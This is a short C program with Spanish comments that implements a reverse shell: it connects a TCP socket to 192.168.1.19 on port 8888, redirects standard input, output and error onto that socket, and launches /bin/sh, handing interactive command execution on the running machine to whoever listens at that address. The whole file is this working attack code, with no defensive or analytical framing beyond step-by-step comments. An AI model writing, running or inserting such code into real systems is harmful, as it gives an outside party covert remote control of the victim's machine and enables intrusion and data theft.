#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main() {
    int _socket;
    struct sockaddr_in servidor_addr;

    // Creación de socket
    _socket = socket(AF_INET, SOCK_STREAM, 0);

    // Configuración 
    servidor_addr.sin_family = AF_INET;
    servidor_addr.sin_port = htons(8888); 
    servidor_addr.sin_addr.s_addr = inet_addr("192.168.1.19");

    //Conexión
    connect(_socket, (struct sockaddr *)&servidor_addr, sizeof(servidor_addr));

    // Redirecciones stdin = 0, stdout = 1 y stderr = 2 hacia el socket
    dup2(_socket, 0);
    dup2(_socket, 1);
    dup2(_socket, 2);

    // Ejecutación de shell
    char *const args[] = {"/bin/sh", NULL};
    execve("/bin/sh", args, NULL);

    return 0;
}

